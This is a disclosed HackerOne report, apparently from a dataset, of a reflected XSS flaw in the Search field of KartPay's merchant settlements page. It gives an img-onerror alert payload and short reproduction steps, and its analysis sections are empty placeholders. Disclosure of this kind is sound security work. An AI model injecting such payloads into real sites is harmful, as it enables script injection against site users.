---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '653221'
original_report_id: '653221'
title: XSS in https://merchant.kartpay.com/settlements
team_handle: kartpay
created_at: '2019-07-22T19:40:36.832Z'
disclosed_at: '2019-08-28T15:27:35.632Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: '*.kartpay.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# XSS in https://merchant.kartpay.com/settlements

## Metadata

- HackerOne Report ID: 653221
- Weakness: 
- Program: kartpay
- Disclosed At: 2019-08-28T15:27:35.632Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Parameter**
``Search``

**Payload**
``"><img src=x onerror=alert(domain)>``

**URL**
``https://merchant.kartpay.com/settlements``

**Steps to reproduce**
1. Go to URL: https://merchant.kartpay.com/settlements
2. Enter above payload.
3. You will see xss payload getting executed.

{F535235}
{F535234}
{F535236}

## Impact

Cross-site scripting is a flaw that allows users to inject HTML or JavaScript code into a page enabling arbitrary input. There are two main variants of XSS, stored and reflected.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
